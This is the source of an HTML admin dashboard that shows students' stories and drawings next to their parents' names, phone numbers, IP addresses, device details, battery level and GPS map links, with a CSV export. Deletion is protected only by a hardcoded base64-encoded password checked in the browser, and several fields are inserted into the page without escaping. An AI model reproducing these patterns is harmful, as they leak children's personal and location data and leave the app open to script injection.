<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body class="dark">
    <div class="form-wrapper" style="align-items: flex-start; padding-top: 50px;">
        <div class="form-card admin-card">
            <div class="header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
                <div>
                    <h2>Live Student Data</h2>
                    <span id="activeCount" style="color:#00ffaa; font-size:12px;">Waiting for data...</span>
                </div>
                <div style="display:flex; gap:10px;">
                    <button onclick="downloadCSV()" class="gold-btn" style="padding:8px 15px; font-size:12px;">üìä Export CSV</button>
                    <button onclick="location.href='index.html'" style="padding:8px 15px; font-size:12px;">üè† Home</button>
                </div>
            </div>
            
            <table class="admin-table">
                <thead>
                    <tr>
                        <th>Student</th>
                        <th>Network/IP</th>
                        <th style="text-align:center;">Loc</th>
                        <th>Work</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr><td colspan="5" style="text-align:center; padding: 20px;">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <div class="modal-overlay" id="infoModal">
        <div class="modal-content">
            <span class="modal-close" onclick="document.getElementById('infoModal').style.display='none'">√ó</span>
            <h2 id="modalTitle" style="margin-bottom:20px; color:#fff;">Details</h2>
            <div id="modalBody"></div>
        </div>
    </div>

    <script type="module">
        import { db, collection, onSnapshot, doc, deleteDoc } from "./config.js";

        // --- GLOBAL STORAGE FOR DATA (FIXES BIG STORY BUG) ---
        window.allStudents = {};

        // --- 1. VIEW WORK (Fixed Logic: Looks up data by ID) ---
        window.viewWork = (id, type) => {
            const data = window.allStudents[id];
            if(!data) return alert("Error loading data");

            const modal = document.getElementById("infoModal");
            const body = document.getElementById("modalBody");
            document.getElementById("modalTitle").innerText = type === 'story' ? "üìù Student Story" : "üé® Student Art";
            
            if(type === 'story') {
                // Use innerText to prevent script hacking, allow scrolling
                body.innerHTML = "";
                const p = document.createElement("div");
                p.style.cssText = "font-size:16px; line-height:1.6; color:#ccc; white-space: pre-wrap; max-height:60vh; overflow-y:auto; padding:10px; background:rgba(255,255,255,0.05); border-radius:8px;";
                p.innerText = data.story || "No story content.";
                body.appendChild(p);
            } else {
                body.innerHTML = `<img src="${data.drawingBase64}" style="width:100%; border-radius:10px;">`;
            }
            modal.style.display = "flex";
        };

        // --- 2. DELETE STUDENT ---
        window.deleteStudent = async (id) => {
            if(confirm("‚ö†Ô∏è PERMANENT DELETE: Are you sure?")) {
                const p = prompt("Enter Admin Password:");
                if(btoa(p) === "OTAyMTA=") {
                    try {
                        await deleteDoc(doc(db, "students", id));
                        // No alert needed, table updates automatically
                    } catch(e) { alert("Error: " + e.message); }
                } else { alert("Wrong Password"); }
            }
        };

        // --- 3. CSV EXPORT ---
        window.downloadCSV = () => {
            const rows = [["Name", "Grade", "Parent", "Phone", "IP Address", "Network", "Battery", "Story/Art"]];
            
            Object.values(window.allStudents).forEach(d => {
                let workType = d.story ? "Story" : (d.drawingBase64 ? "Art" : "Pending");
                // Escape quotes for CSV format
                let cleanName = `"${d.studentName}"`;
                let cleanStory = d.story ? `"${d.story.replace(/"/g, '""')}"` : "N/A";
                
                rows.push([
                    cleanName, d.grade, d.parentName, d.contact, 
                    d.ipAddress, d.connection, d.battery, workType
                ]);
            });

            let csvContent = "data:text/csv;charset=utf-8," + rows.map(e => e.join(",")).join("\n");
            const encodedUri = encodeURI(csvContent);
            const link = document.createElement("a");
            link.setAttribute("href", encodedUri);
            link.setAttribute("download", "student_data.csv");
            document.body.appendChild(link);
            link.click();
        };

        // --- 4. VIEW SECURITY ---
        window.viewSecurity = (id) => {
            const d = window.allStudents[id];
            const modal = document.getElementById("infoModal");
            const body = document.getElementById("modalBody");
            document.getElementById("modalTitle").innerText = "üîí Security Profile";
            
            const mapLink = d.location && d.location.lat ? 
                `https://www.google.com/maps?q=${d.location.lat},${d.location.lng}` : "#";

            body.innerHTML = `
                <div style="text-align:center;">
                    <a href="${mapLink}" target="_blank" class="primary-btn" style="text-decoration:none; display:inline-block; margin-bottom:15px; background:#00e5ff; color:#000;">üó∫Ô∏è Open Google Maps</a>
                </div>
                <hr style="border-color:#333; margin:20px 0;">
                <p><strong>üåê IP:</strong> <span style="color:#00e5ff">${d.ipAddress}</span></p>
                <p><strong>üì∂ Network:</strong> <span style="color:#ffaa00">${d.connection || "Unknown"}</span></p>
                <p><strong>üîã Battery:</strong> <span style="color:#00ffaa">${d.battery || "Unknown"}</span></p>
                <p><strong>üì± Device:</strong> <span style="color:#aaa; font-size:12px;">${d.deviceInfo}</span></p>
            `;
            modal.style.display = "flex";
        };

        // --- 5. LIVE DATA LISTENER ---
        onSnapshot(collection(db, "students"), (snapshot) => {
            const tbody = document.getElementById("tableBody");
            document.getElementById("activeCount").innerText = `üü¢ Total Entries: ${snapshot.size}`;
            
            if (snapshot.empty) { tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;">No data.</td></tr>`; return; }
            tbody.innerHTML = "";
            window.allStudents = {}; // Reset global object
            
            snapshot.forEach(docSnap => {
                const d = docSnap.data();
                const id = docSnap.id;
                
                // STORE DATA GLOBALLY (Fixes button limit issues)
                window.allStudents[id] = d;

                // LOCATION BUTTON
                let pinBtn = `<span style="opacity:0.3">üö´</span>`;
                if(d.location && d.location.lat) {
                    pinBtn = `<button onclick='viewSecurity("${id}")' style="background:none; border:none; font-size:24px; cursor:pointer;" title="View Security">üìç</button>`;
                }

                // WORK BUTTON
                let workBtn = `<span style="opacity:0.3">-</span>`;
                if(d.story) {
                    workBtn = `<button onclick='viewWork("${id}", "story")' style="font-size:12px; padding:6px 12px; background:#00e5ff; color:#000; border-radius:6px; font-weight:bold;">View Story</button>`;
                } else if (d.drawingBase64) {
                    workBtn = `<button onclick='viewWork("${id}", "art")' style="font-size:12px; padding:6px 12px; background:#ff00e5; color:#fff; border-radius:6px; font-weight:bold;">View Art</button>`;
                }

                const row = `
                    <tr>
                        <td><b>${d.studentName}</b><br><small>${d.grade} (${d.section})</small></td>
                        <td style="font-size:11px; color:#aaa;">IP: ${d.ipAddress.split('(')[0]}<br><span style="color:#ffaa00">${d.connection || "?"}</span></td>
                        <td style="text-align:center;">${pinBtn}</td>
                        <td style="text-align:center;">${workBtn}</td>
                        <td style="text-align:center;">
                            <button onclick="deleteStudent('${id}')" style="background:rgba(255,0,0,0.2); border:1px solid red; color:red; padding:6px 10px; border-radius:6px; cursor:pointer;">üóëÔ∏è</button>
                        </td>
                    </tr>
                `;
                tbody.innerHTML += row;
            });
        });
    </script>
</body>
</html>